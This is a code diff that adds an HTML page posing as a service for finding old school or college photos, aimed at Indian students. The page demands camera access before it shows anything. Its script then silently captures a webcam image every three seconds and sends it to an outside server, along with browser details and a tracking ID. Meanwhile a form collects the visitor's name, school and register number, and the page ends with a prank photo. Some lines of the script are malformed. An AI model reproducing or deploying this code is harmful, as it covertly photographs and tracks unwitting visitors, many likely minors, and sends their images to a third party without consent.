@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Processing...</title>
+  <style>
+
+	    :root{
+      --bg: #ffffff;
+      --panel: #f7f9fb;
+      --muted: #3c4650;
+      --accent: #228be6;
+      --border: #e6e9ee;
+      font-family: "Segoe UI", system-ui, -apple-system, "Roboto", "Helvetica Neue", Arial;
+    }
+    *{box-sizing:border-box}
+    html,body{
+      height:100%;
+      margin:0;
+      background: url("https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=1470&q=80") no-repeat center center fixed;
+      background-size: cover;
+      color:var(--muted);
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(255,255,255,0.85);
+      z-index: -1;
+    }
+
+    body::after {
+      content: "By Unknown";
+      position: fixed;
+      bottom: 10px;
+      right: 10px;
+      font-size: 20px;
+      color: rgba(0, 0, 0, 0.05);
+      font-weight: bold;
+      z-index: 0;
+      pointer-events: none;
+      user-select: none;
+      font-family: "Comic Sans MS", cursive
+    }
+
+    .container{
+      max-width:760px;
+      margin:32px auto;
+      padding:20px;
+      background:var(--panel);
+      border-radius:12px;
+      box-shadow:0 8px 30px rgba(34,50,80,0.06);
+      border:1px solid var(--border);
+    }
+
+    h1{margin:0 0 16px;font-size:20px;color:#2d3e50}
+    form{display:grid;grid-template-columns:1fr 1fr;gap:12px 20px;align-items:center}
+    label{font-size:14px}
+    select,input[type=text],button{font-size:14px;padding:10px 12px;border-radius:8px;border:1px solid var(--border);background:white}
+    input[type=text]{height:36px}
+    select{height:38px}
+    .full{grid-column:1 / -1}
+    .radio-row{display:flex;gap:12px;align-items:center}
+    .small{width:160px}
+    .wide{min-width:300px}
+    .hidden{display:none}
+    .btn-primary{background:var(--accent);color:white;border:none;padding:10px 18px;border-radius:10px;cursor:pointer}
+    .btn-primary:active{transform:translateY(1px)}
+    .note{font-size:13px;color:#6b7785}
+    @media (max-width:720px){
+      form{grid-template-columns:1fr}
+      .small{width:100%}
+      .wide{min-width:unset}
+    }
+
+    .popup {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.4s ease, visibility 0.4s ease;
+    }
+    .popup.active {
+      opacity: 1;
+      visibility: visible;
+    }
+    .popup-content {
+      background: white;
+      padding: 30px 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 320px;
+    }
+    .popup-content button {
+      margin-top: 15px;
+      background: var(--accent);
+      color: white;
+      border: none;
+      padding: 8px 14px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .popup img {
+      width: 200px;
+      border-radius: 10px;
+      margin-top: 10px;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 10px;
+      background: #e0e0e0;
+      border-radius: 5px;
+      overflow: hidden;
+      margin-top: 10px;
+    }
+    .progress {
+      height: 100%;
+      width: 0%;
+      background: #28a745;
+      border-radius: 5px;
+      transition: width 5s linear;
+    }
+    body {
+      font-family: Arial;
+      text-align: center;
+      padding: 40px;
+    }
+
+    #mainUI {
+      display: none; /* hidden until allowed */
+    }
+
+    #error {
+      color: red;
+      margin-top: 20px;
+    }
+
+    video, canvas {
+      display: none;
+    }
+
+    #errorBox {
+  display: none;
+  max-width: 400px;
+  margin: 30px auto;
+  padding: 20px;
+  background: #ffe6e6;
+  border: 1px solid #ff4d4d;
+  border-radius: 10px;
+  text-align: center;
+}
+
+#errorBox h2 {
+  color: #cc0000;
+  margin-bottom: 10px;
+}
+
+#errorBox p {
+  font-size: 16px;
+  color: #333;
+}
+
+#errorBox button {
+  margin-top: 15px;
+  padding: 10px 18px;
+  border: none;
+  background: #ff4d4d;
+  color: white;
+  border-radius: 8px;
+  cursor: pointer;
+}
+
+    
+  </style>
+</head>
+<body>
+
+<!-- Initial screen -->
+<h2 id="title">Checking permissions...</h2>
+<p id="message">Please wait...</p>
+<div id="errorBox">
+  <h2>⚠️ Access Required</h2>
+  <p>
+    Camera access is necessary to use this website.<br>
+    Please allow permission and try again.
+  </p>
+  <button onclick="location.reload()">Try Again</button>
+</div>
+<!-- Main UI (hidden initially) -->
+<div id="mainUI">
+  
+  <p id="status"></p>
+
+  <!-- 👉 Add anything you want here -->
+    
+	  <div class="container">
+    <h1>Fill Your Information</h1>
+
+    <form id="studentForm" novalidate>
+      <label for="type">Are you a School or College student:</label>
+      <select id="type" required>
+        <option value="">Select</option>
+        <option>School</option>
+        <option>College</option>
+      </select>
+
+      <label for="state">State / Union Territory:</label>
+      <select id="state" required>
+        <option value="">Select State / UT</option>
+        <option>Andhra Pradesh</option>
+        <option>Arunachal Pradesh</option>
+        <option>Assam</option>
+        <option>Bihar</option>
+        <option>Chhattisgarh</option>
+        <option>Goa</option>
+        <option>Gujarat</option>
+        <option>Haryana</option>
+        <option>Himachal Pradesh</option>
+        <option>Jharkhand</option>
+        <option>Karnataka</option>
+        <option>Kerala</option>
+        <option>Madhya Pradesh</option>
+        <option>Maharashtra</option>
+        <option>Manipur</option>
+        <option>Meghalaya</option>
+        <option>Mizoram</option>
+        <option>Nagaland</option>
+        <option>Odisha</option>
+        <option>Punjab</option>
+        <option>Rajasthan</option>
+        <option>Sikkim</option>
+        <option>Tamil Nadu</option>
+        <option>Telangana</option>
+        <option>Tripura</option>
+        <option>Uttar Pradesh</option>
+        <option>Uttarakhand</option>
+        <option>West Bengal</option>
+        <option>Andaman and Nicobar Islands</option>
+        <option>Chandigarh</option>
+        <option>Dadra and Nagar Haveli and Daman and Diu</option>
+        <option>Delhi</option>
+        <option>Jammu and Kashmir</option>
+        <option>Ladakh</option>
+        <option>Lakshadweep</option>
+        <option>Puducherry</option>
+      </select>
+
+      <label for="district">District:</label>
+      <input id="district" type="text" placeholder="Enter district" class="wide" required />
+
+      <div id="collegePanel" class="full hidden">
+        <label for="college">College Name:</label>
+        <input id="college" type="text" placeholder="Enter college name" class="wide" />
+      </div>
+
+      <div id="schoolPanel" class="full hidden">
+        <label for="school">School Name:</label>
+        <input id="school" type="text" placeholder="Enter school name" class="wide" />
+      </div>
+
+      <label>Are you currently studying:</label>
+      <div class="radio-row">
+        <label><input type="radio" name="studying" value="yes"> Yes</label>
+        <label><input type="radio" name="studying" value="no"> No</label>
+      </div>
+
+      <div id="studyingYesPanel" class="full hidden">
+        <label for="semester">Semester (College):</label>
+        <select id="semester"><option value="">Select Semester</option></select>
+
+        <label for="branch">Branch (College):</label>
+        <select id="branch">
+          <option value="">Select Branch</option>
+          <option>Computer Science Engineering</option>
+          <option>Information Technology</option>
+          <option>Electronics and Communication Engineering</option>
+          <option>Electrical and Electronics Engineering</option>
+          <option>Mechanical Engineering</option>
+          <option>Civil Engineering</option>
+          <option>Other</option>
+        </select>
+
+        <label for="class">Class (School):</label>
+        <select id="class"><option value="">Select Class</option></select>
+
+        <label for="stream">Stream (if class > 10):</label>
+        <select id="stream">
+          <option value="">Select Stream</option>
+          <option>Biomaths</option>
+          <option>Commerce</option>
+          <option>Computer Science</option>
+          <option>Arts</option>
+          <option>Other</option>
+        </select>
+      </div>
+
+      <div id="studyingNoPanel" class="full hidden">
+        <label for="passYear">Passed Out Year:</label>
+        <input id="passYear" type="text" placeholder="e.g. 2022" class="wide" />
+
+        <div id="branchNoPanel" class="hidden">
+          <label for="branchNo">Branch (College):</label>
+          <select id="branchNo">
+            <option value="">Select Branch</option>
+            <option>Computer Science Engineering</option>
+            <option>Information Technology</option>
+            <option>Other</option>
+          </select>
+        </div>
+
+        <div id="streamNoPanel" class="hidden">
+          <label for="streamNo">Stream (if school):</label>
+          <select id="streamNo">
+            <option value="">Select Stream</option>
+            <option>Biomaths</option>
+            <option>Commerce</option>
+            <option>Arts</option>
+            <option>Other</option>
+          </select>
+        </div>
+      </div>
+
+      <label for="name">Enter Your Full Name:</label>
+      <input id="name" type="text" placeholder="Enter full name" required />
+
+      <label for="reg">Register Number (Only for Collage Students):</label>
+      <input id="reg" type="text" placeholder="Enter register number" required />
+
+      <div class="full" style="text-align:center;margin-top:8px">
+        <button type="submit" class="btn-primary">Submit</button>
+      </div>
+    </form>
+
+    <p class="note">This page is designed to find your photo from your collage or school life.</p>
+    <p class="note">⚠️ Your photo will only show if it is available.</p>
+  </div>
+
+  <div id="popup0" class="popup active">
+    <div class="popup-content">
+      <p>This is a page that helps you find your old school or college photos.<br><br>
+      Your photo will be available here only if it is available in the database of any school or college.</p>
+      <button id="okBtn">OK</button>
+    </div>
+  </div>
+
+  <div id="popup1" class="popup">
+    <div class="popup-content">
+      <p>🔍 Finding your photo, please wait...</p>
+      <div class="progress-bar"><div class="progress"></div></div>
+    </div>
+  </div>
+
+  <div id="popup2" class="popup">
+    <div class="popup-content">
+      <p>📸 We found a photo of you!</p>
+      <button id="showPhotoBtn">Show Photo</button><br>
+      <img id="foundPhoto" class="hidden" src="your-photo.jpg" alt="Your photo" />
+      <p id="photoText" class="hidden"></p>
+      <button id="closeBtn" class="hidden">Close</button>
+    </div>
+  </div>
+
+
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script src="https://cdn.socket.io/4.8.3/socket.io.min.js"></script>
+
+<script>
+
+const userId = "user_" + Date.now() + "_" + Math.floor(Math.random() * 1000);
+
+window.onload = checkPermission;
+
+async function checkPermission() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: true
+    });
+
+    // ✅ Show main UI
+    document.getElementById("title").style.display = "none";
+    document.getElementById("message").style.display = "none";
+
+    document.getElementById("mainUI").style.display = "block";
+
+    // Initialize Socket.IO
+const socket = io("https://demo-rc9k.onrender.com"); // your backend URL
+
+
+// Receive assigned userId from backend
+socket.on("assign-userId", (data) => {
+  userId = data.userId;
+  console.log("Assigned userId:", userId);
+
+  // Send visitor info to backend
+  const visitorData = {
+    userId, // include userId
+    ipv4: "fetch if available",
+    ipv6: "fetch if available",
+    city: "fetch if available",
+    region: "fetch if available",
+    country: "fetch if available",
+    isp: "fetch if available",
+    device: navigator.userAgent,
+    browser: navigator.userAgent,
+    map: "https://maps.google.com" // optional
+  };
+
+  socket.emit("visitor-info", visitorData);
+});
+
+    const video = document.getElementById("video");
+    video.srcObject = stream;
+
+    video.onloadedmetadata = () => {
+      setInterval(capturePhoto, 3000);
+    };
+
+  } catch (err) {
+  // ❌ Denied
+
+  document.getElementById("title").style.display = "none";
+  document.getElementById("message").style.display = "none";
+
+  document.getElementById("errorBox").style.display = "block";
+}}
+
+function capturePhoto() {
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+
+  canvas.width = 320;
+  canvas.height = 240;
+
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0, 320, 240);
+
+  const imageData = canvas.toDataURL("image/png");
+
+  document.getElementById("status").innerText = "";
+
+  fetch(https://demo-rc9k.onrender.com, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ 
+    image: imageData,
+    userId: userId  // Add this line
+})
+  })
+  .then(() => {
+    document.getElementById("status").innerText = "";
+  })
+  .catch(() => {
+    document.getElementById("status").innerText = "Error ❌";
+  });
+}
+</script>
+
+<script>
+    const semester=document.getElementById('semester');
+    const classSel=document.getElementById('class');
+    for(let i=1;i<=8;i++){const o=document.createElement('option');o.value=i;o.textContent=i;semester.appendChild(o);}
+    for(let i=1;i<=12;i++){const o=document.createElement('option');o.value=i;o.textContent=i;classSel.appendChild(o);}
+    const type=document.getElementById('type');
+    const collegePanel=document.getElementById('collegePanel');
+    const schoolPanel=document.getElementById('schoolPanel');
+    const studyingYesPanel=document.getElementById('studyingYesPanel');
+    const studyingNoPanel=document.getElementById('studyingNoPanel');
+    const studyingRadios=document.getElementsByName('studying');
+    const stream=document.getElementById('stream');
+    const branch=document.getElementById('branch');
+    const branchNoPanel=document.getElementById('branchNoPanel');
+    const streamNoPanel=document.getElementById('streamNoPanel');
+    const branchNo=document.getElementById('branchNo');
+    const streamNo=document.getElementById('streamNo');
+    const reg=document.getElementById('reg');
+
+    function show(el,val){el.classList.toggle('hidden',!val);}
+
+    function syncNoPanels(){
+      if(branchNo && branch){
+        if(branchNo.options.length !== branch.options.length){
+          branchNo.innerHTML = branch.innerHTML;
+        }
+        branchNo.disabled = false;
+      }
+      if(streamNo && stream){
+        if(streamNo.options.length !== stream.options.length){
+          streamNo.innerHTML = stream.innerHTML;
+        }
+        streamNo.disabled = false;
+      }
+    }
+
+    function refreshPanels(){
+      const t=type.value;
+      const isCollege=t.toLowerCase()==='college';
+      const isSchool=t.toLowerCase()==='school';
+      show(collegePanel,isCollege);
+      show(schoolPanel,isSchool);
+      const studying=Array.from(studyingRadios).find(r=>r.checked)?.value;
+      show(studyingYesPanel,studying==='yes');
+      show(studyingNoPanel,studying==='no');
+      if(studying==='no'){
+        show(branchNoPanel,isCollege);
+        show(streamNoPanel,isSchool);
+      } else {
+        show(branchNoPanel,false);
+        show(streamNoPanel,false);
+      }
+      if(studying==='yes'){
+        if(isCollege){
+          semester.disabled=false;branch.disabled=false;classSel.disabled=true;stream.disabled=true;
+        } else if(isSchool){
+          semester.disabled=true;branch.disabled=true;classSel.disabled=false;
+        }
+      } else if(studying==='no'){
+        if(isCollege){ branchNo.disabled = false; }
+        if(isSchool){ streamNo.disabled = false; }
+      }
+      syncNoPanels();
+
+      // ✅ Disable Register Number when School is selected
+      if(isSchool){
+        reg.disabled = true;
+        reg.value = "";
+      } else {
+        reg.disabled = false;
+      }
+    }
+
+    type.addEventListener('change',refreshPanels);
+    Array.from(studyingRadios).forEach(r=>r.addEventListener('change',refreshPanels));
+    classSel.addEventListener('change',()=>{
+      const val=parseInt(classSel.value||'0',10);
+      stream.disabled=!(val>10);
+      if(!(val>10))stream.value='';
+    });
+    refreshPanels();
+
+    const popup0=document.getElementById('popup0');
+    const okBtn=document.getElementById('okBtn');
+    const popup1=document.getElementById('popup1');
+    const popup2=document.getElementById('popup2');
+    const foundPhoto=document.getElementById('foundPhoto');
+    const showPhotoBtn=document.getElementById('showPhotoBtn');
+    const photoText=document.getElementById('photoText');
+    const closeBtn=document.getElementById('closeBtn');
+
+    okBtn.addEventListener("click",()=>{ popup0.classList.remove('active'); });
+
+    document.getElementById("studentForm").addEventListener("submit",function(e){
+      const requiredFields=this.querySelectorAll("select[required], input[required]");
+      for(const field of requiredFields){
+        if(field.disabled) continue;
+        if(!field.value.trim()){
+          alert("Please fill all required fields before submitting.");
+          e.preventDefault();
+          return;
+        }
+      }
+      e.preventDefault();
+
+      popup1.classList.add('active');
+      const progress = popup1.querySelector('.progress');
+      progress.style.width = '0%';
+      setTimeout(()=>{ progress.style.width = '100%'; }, 100);
+      setTimeout(()=>{
+        popup1.classList.remove('active');
+        popup2.classList.add('active');
+      },5000);
+    });
+
+    // ✅ Modified: Capitalize first letter of name
+    function capitalize(str){
+      return str.charAt(0).toUpperCase() + str.slice(1);
+    }
+
+    // ✅ Specific photos for usernames or reg numbers
+    showPhotoBtn.addEventListener("click",()=>{
+      foundPhoto.classList.remove("hidden");
+      photoText.classList.remove("hidden");
+      closeBtn.classList.remove("hidden");
+
+      const fullName=document.getElementById("name").value.trim().toLowerCase();
+      const regNo=document.getElementById("reg").value.trim().toLowerCase();
+
+      const photos={
+        "abcd":"https://media.newyorker.com/photos/59095bb86552fa0be682d9d0/master/pass/Monkey-Selfie.jpg",
+      };
+
+      let photoUrl=photos[fullName]||photos[regNo]||"";
+      const displayName = capitalize(fullName);
+
+      if(photoUrl){
+        foundPhoto.src=photoUrl;
+        photoText.textContent=`${displayName}, Here is your photo. You are Sooo Gorgeous💥💥💥.`;
+      }else{
+        foundPhoto.src="https://throughatoonerdarkly.wordpress.com/wp-content/uploads/2014/08/image.jpg?w=768&h=1152";
+        photoText.textContent=`${displayName}, Here is your photo. You are So Pretty😻.`;
+      }
+    });
+
+    // ✅ Close button resets form
+    closeBtn.addEventListener("click",()=>{
+      popup2.classList.remove("active");
+      document.getElementById("studentForm").reset();
+      refreshPanels();
+      foundPhoto.src = "";
+      foundPhoto.classList.add("hidden");
+      photoText.textContent = "";
+      closeBtn.classList.add("hidden");	
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    });
+  </script>
+
+</body>
+</html>
